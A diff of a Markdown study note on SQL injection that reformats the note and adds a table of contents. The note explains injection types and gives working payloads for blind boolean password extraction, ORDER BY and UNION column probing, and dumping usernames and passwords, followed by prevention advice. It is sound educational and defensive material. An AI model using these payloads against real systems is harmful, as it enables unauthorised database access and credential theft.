@@ -7,7 +7,34 @@ toc: true
 image:
 ---
 
-[toc]
+- [Meow's CyberAttack - SQL Injection](#meows-cyberattack---sql-injection)
+  - [Overall](#overall)
+  - [SQL injection Type](#sql-injection-type)
+    - [Blind SQL injection attacks](#blind-sql-injection-attacks)
+      - [Exploiting blind SQL injection by triggering conditional responses](#exploiting-blind-sql-injection-by-triggering-conditional-responses)
+      - [Inducing conditional responses by triggering SQL errors](#inducing-conditional-responses-by-triggering-sql-errors)
+      - [Exploiting blind SQL injection by triggering time delays](#exploiting-blind-sql-injection-by-triggering-time-delays)
+      - [Exploiting blind SQL injection using out-of-band (OAST) techniques](#exploiting-blind-sql-injection-using-out-of-band-oast-techniques)
+      - [prevent Blind SQL injection attacks](#prevent-blind-sql-injection-attacks)
+  - [launch:](#launch)
+  - [SQL Injection Vulnerabilities](#sql-injection-vulnerabilities)
+  - [Preparing for an Attack](#preparing-for-an-attack)
+  - [Conducting an Attack](#conducting-an-attack)
+    - [Lack of Strong Typing](#lack-of-strong-typing)
+    - [SQL injection UNION attacks](#sql-injection-union-attacks)
+      - [Find number of columns with SQL injection UNION attack](#find-number-of-columns-with-sql-injection-union-attack)
+      - [Find columns with a useful data type in an SQL injection UNION attack](#find-columns-with-a-useful-data-type-in-an-sql-injection-union-attack)
+      - [retrieve interesting data by SQL injection UNION attack to](#retrieve-interesting-data-by-sql-injection-union-attack-to)
+      - [Querying the database type and version](#querying-the-database-type-and-version)
+      - [Listing the contents of the database](#listing-the-contents-of-the-database)
+      - [Equivalent to information schema on Oracle](#equivalent-to-information-schema-on-oracle)
+      - [Retrieving multiple values within a single column](#retrieving-multiple-values-within-a-single-column)
+    - [Acquiring Table Column Names](#acquiring-table-column-names)
+  - [Automated SQL Injection Tools](#automated-sql-injection-tools)
+  - [SQL Injection Prevention and Remediation](#sql-injection-prevention-and-remediation)
+    - [Stored Procedures](#stored-procedures)
+    - [Extended Stored Procedures](#extended-stored-procedures)
+    - [Sewer System Tables](#sewer-system-tables)
 
 ---
 
@@ -15,6 +42,7 @@ image:
 
 ---
 
+## Overall
 
 cross-site scripting is not the only place where URL encoding is used.
 - Anywhere you want to obscure text, you can URL-encode it.
@@ -58,7 +86,7 @@ database factores:
 ---
 
 
-## type of SQL injection
+## SQL injection Type
 
 Traditionally, classify the types of SQL injection in accordance with `order of injection`, `input data type`, `server response` and `data extraction channel`.
 
@@ -66,6 +94,7 @@ The framework of order of injection:
 - **first order injection**:
   - the attacker enters a malicious string and commands it to be executed immediately.
   - app take user input from the HTTP request, incorporates the input to an SQL query in an unsafe way.
+
 - **second order injection / stored SQL injection attack**
   - the attacker inputs a malicious string that is rather resistant and stealthy.
   - app take user input from the HTTP request, and stored it (in database...) for future use.
@@ -82,23 +111,21 @@ The framework of order of injection:
 
 ![Screen Shot 2020-11-19 at 02.09.39](https://i.imgur.com/82YEpIO.png)
 
-
 input data type classification:
 - String based injection and integer based injection.
 - string based injection differs from an integer based injection in the ability to display the results of the SQLi query.
 - In string based injection, it is not possible to see the results of an injection in real time.
-
 
 use server response as a criterion
 - error based SQLi and blind based SQLi.
 - In **error based SQLi**, the attacker exploits the error messages created by the data server.
 - In **blind based SQLi**, the attacker employs a method that aims to exploit the database through asking true or false questions.
 
-
 ---
 
 
 ### Blind SQL injection attacks
+
 - injection attack on a web server based on `responses to True/False questions`.
 - Not all queries will generate output.
 - be flying blind because
@@ -119,68 +146,79 @@ use server response as a criterion
 ---
 
 #### Exploiting blind SQL injection by triggering conditional responses
+
 - Consider an application that uses tracking cookies to gather analytics about usage.
   - Requests to the application include a cookie header like this:
     - `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
   - When a request containing a TrackingId cookie is processed, the application determines whether this is a known user using an SQL query like this:
     - `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
 
-- This query is vulnerable to SQL injection
-- the results from the query are not returned to the user.
-- but the application does behave differently depending on whether the query returns any data.
-- If it returns data (because a recognized TrackingId was submitted), then a "Welcome back" message is displayed within the page.
+  - This query is **vulnerable to SQL injection**
+    - the results from the query are not returned to the user.
+    - but the application does behave differently depending on whether the query returns any data.
+    - If it returns data (because a recognized TrackingId was submitted), then a `"Welcome back"` message is displayed within the page.
+    - This behavior is enough to be able to `exploit the blind SQL injection vulnerability and retrieve information`, by triggering different responses conditionally, depending on an injected condition.
 
-- This behavior is enough to be able to exploit the blind SQL injection vulnerability and retrieve information, by triggering different responses conditionally, depending on an injected condition.
-- To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
+  - To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
 
-```
-xyz' UNION SELECT 'a' WHERE 1=1--
-xyz' UNION SELECT 'a' WHERE 1=2--
+    ```sql
+    xyz' UNION SELECT 'a' WHERE 1=1--
+    xyz' UNION SELECT 'a' WHERE 1=2--
+    ```
 
-The first of these values will cause the query to return results
-- because the injected or 1=1 condition is true,
-- and so the "Welcome back" message will be displayed.
+  - The first of these values will cause the query to return results
+    - because the injected or 1=1 condition is true,
+    - and so the "Welcome back" message will be displayed.
 
-The second value will cause the query to not return any results,
-- because the injected condition is false,
-- and so the "Welcome back" message will not be displayed.
-```
+  - The second value will cause the query to not return any results,
+    - because the injected condition is false,
+    - and so the "Welcome back" message will not be displayed.
 
 > This allows us to determine the answer to any single injected condition, and so extract data one bit at a time.
 
-```
-suppose a table called Users
-- columns: Username and Password
-- a user called Administrator.
+Attack Example:
+- suppose a table called `Users`
+  - columns: `Username` and `Password`
+  - a user called `Administrator`.
 
-We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.
+- We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.
 
 1. start with the following input:
+   - This returns the "Welcome back" message,
+   - indicating that the injected condition is true,
+   - and so the first character of the password is greater than `m`.
 
-	xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 'm'--
-
-	- This returns the "Welcome back" message, indicating that the injected condition is true,
-	- and so the first character of the password is greater than m.
-
+```sql
+xyz' UNION SELECT 'a' FROM Users
+WHERE Username = 'Administrator'
+AND SUBSTRING(Password, 1, 1) > 'm'--
+```
 
 2. Next send the following input:
+	 - This does not return the "Welcome back" message,
+	 - indicating that the injected condition is false,
+	 - and so the first character of the password is not greater than `t`.
 
-	xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) > 't'--
 
-	- This does not return the "Welcome back" message, indicating that the injected condition is false,
-	- and so the first character of the password is not greater than t.
+```sql
+xyz' UNION SELECT 'a' FROM Users
+WHERE Username = 'Administrator'
+AND SUBSTRING(Password, 1, 1) > 't'--
+```
 
 
 3. Eventually, confirming that the first character of the password is s:
 
-	xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) = 's'--
-
+```sql
+xyz' UNION SELECT 'a' FROM Users
+WHERE Username = 'Administrator'
+AND SUBSTRING(Password, 1, 1) = 's'--
+```
 
 4. continue this process to systematically determine the full password for the Administrator user.
 
-Note: The SUBSTRING function is called SUBSTR on some types of database.
+> Note: The `SUBSTRING` function is called `SUBSTR` on some types of database.
 For more details, see the SQL injection cheat sheet.
-```
 
 
 ---
@@ -191,12 +229,9 @@ suppose instead that the application carries out the same SQL query, but does no
 - The preceding technique will not work,
 - because injecting different Boolean conditions makes no difference to the application's responses.
 
-
 In this situation, induce the application to return conditional responses by triggering SQL errors conditionally, depending on an injected condition.
 - This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false.
 - Very often, an unhandled error thrown by the database will cause some difference in the application's response (such as an error message), allowing us to infer the truth of the injected condition.
-
-
 
 These inputs use the `CASE` keyword to `test a condition` and `return a different expression depending on whether the expression is true`.
 - Assuming the error causes some difference in the application's HTTP response, use this difference to infer whether the injected condition is true.
@@ -302,12 +337,11 @@ Having confirmed a way to trigger out-of-band interactions, then use the out-of-
 ---
 
 
-How to prevent blind SQL injection attacks?
-Although the techniques needed to find and exploit blind SQL injection vulnerabilities are different and more sophisticated than for regular SQL injection, the measures needed to prevent SQL injection are the same regardless of whether the vulnerability is blind or not.
+#### prevent Blind SQL injection attacks
 
-As with regular SQL injection, blind SQL injection attacks can be prevented through the careful use of parameterized queries, which ensure that user input cannot interfere with the structure of the intended SQL query.
+- Although the techniques needed to find and exploit blind SQL injection vulnerabilities are different and more sophisticated than for regular SQL injection, the measures needed to prevent SQL injection are the same regardless of whether the vulnerability is blind or not.
 
-
+- As with regular SQL injection, blind SQL injection attacks can be prevented through the careful use of `parameterized queries`, which ensure that user input cannot interfere with the structure of the intended SQL query.
 
 ---
 
@@ -539,7 +573,7 @@ The first method
 - injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs.
 - For example, assuming the injection point is a quoted string within the `WHERE` clause of the original query, you would submit:
 
-```
+```sql
 ' ORDER BY 1--
 ' ORDER BY 2--
 ' ORDER BY 3--
@@ -561,7 +595,7 @@ https://abc.net/filter?category=Lifestyle' ORDER BY 3--
 The second method
 - submitting a series of `UNION SELECT` payloads specifying a different number of null values:
 
-```
+```sql
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
@@ -609,7 +643,7 @@ The reason for performing an `SQL injection UNION attack` is to be able to retri
 
 For example, if the query returns four columns, you would submit:
 
-```
+```sql
 ' UNION SELECT 'a',NULL,NULL,NULL--
 ' UNION SELECT NULL,'a',NULL,NULL--
 ' UNION SELECT NULL,NULL,'a',NULL--
@@ -631,9 +665,9 @@ For example, if the query returns four columns, you would submit:
 3. you are in a position to retrieve interesting data.
 
 Suppose that:
-*   The original query returns two columns, both of which can hold string data.
-*   The injection point is a quoted string within the `WHERE` clause.
-*   The database contains a table called `users` with the columns `username` and `password`.
+* The original query returns two columns, both of which can hold string data.
+* The injection point is a quoted string within the `WHERE` clause.
+* The database contains a table called `users` with the columns `username` and `password`.
 
 - to retrieve the contents of the `users` table by submitting the input:
   - `' UNION SELECT username, password FROM users--`
@@ -643,9 +677,11 @@ Suppose that:
 ---
 
 #### Querying the database type and version
+
 Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.
 
 The queries to determine the database version for some popular database types are as follows:
+
 ```
 | Database type    | Query                   |
 | ---------------- | ----------------------- |
@@ -657,11 +693,13 @@ The queries to determine the database version for some popular database types ar
 ---
 
 #### Listing the contents of the database
+
 - query `information_schema.tables` to list the tables in the database:
 
 `SELECT * FROM information_schema.tables`
 
 This returns output like the following:
+
 ```
 | TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
 | ------------- | ------------ | ---------- | ---------- |
@@ -708,7 +746,7 @@ This returns output like the following:
 
 The results from the query will let you read all of the usernames and passwords, for example:
 
-```
+```bash
 ...
 administrator~s3cure
 wiener~peter
@@ -737,8 +775,8 @@ Example 1:
 - the page `http://page/index.asp?id=20`.
 - use the UNION statement to set up a query as follows:
   - `http://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --`
-    - <kbd>Information_Schema Tables</kbd>: hold data on all the tables in the server database
-    - <kbd>Table Name</kbd> field: holds name of each table in the database.
+    - `<kbd>Information_Schema Tables</kbd>`: hold data on all the tables in the server database
+    - `<kbd>Table Name</kbd> field`: holds name of each table in the database.
 
 - This string attempts to UNION the integer 20 with another string from the database.
   - `SELECT`: provide the name of the ﬁrst table in the database
@@ -815,8 +853,6 @@ Examples:
 In this manner, all the remaining columns in the table can be found.
 
 
-
-
 ---
 
 
@@ -882,8 +918,6 @@ popular SQL injection tools：
 - The buffer overﬂow can result in the execution of malicious code in the server using the xp_cmdshell stored procedure.
 
 
-
-
 for vulnerabilities:
 
 **SQLBlock**
@@ -920,7 +954,6 @@ Measures to mitigate SQL injection attacks.
 - does not guarantee that SQL injection can be completely eliminated,
 - but make it more difficult for hackers to conduct these attacks.
 
-
 Defend attack:
 - **privilege**:
   - Check for `accounts with weak / old passwords`
@@ -930,9 +963,13 @@ Defend attack:
     - not connecting the user to the database with the privileges of an owner of the database or of a superuser.
   - Run database applications from a low-privilege account.
   - Set security privileges on the database to the least needed.
+
 - Ensure that **patches on the server are up to date** and properly installed.
+
 - **Append and prefix quotes** to all client inputs.
+
 - **Limit the use of dynamic SQL queries**, if possible.
+
 - **Limit user inputs to one query**, preventing multi-statement attacks.
 
 - **Input validation / filter input**. Server side validation.
@@ -1031,8 +1068,6 @@ Another effective stored procedure in SQL injections: master.dbo.sp_makewebtask:
 
 ![Screen Shot 2020-11-19 at 01.50.37](https://i.imgur.com/chM5COm.png)
 
-
-
 ---
 
 ### Extended Stored Procedures
@@ -1072,12 +1107,6 @@ Sewer Database Tables
 | SYS.USER_TABLES               |
 | SYS.USER_TRIGGERS             |
 | SYS.USER_VIEWS SYS.ALL_TABLES |
-
-
-
-
-
-
 
 
 .
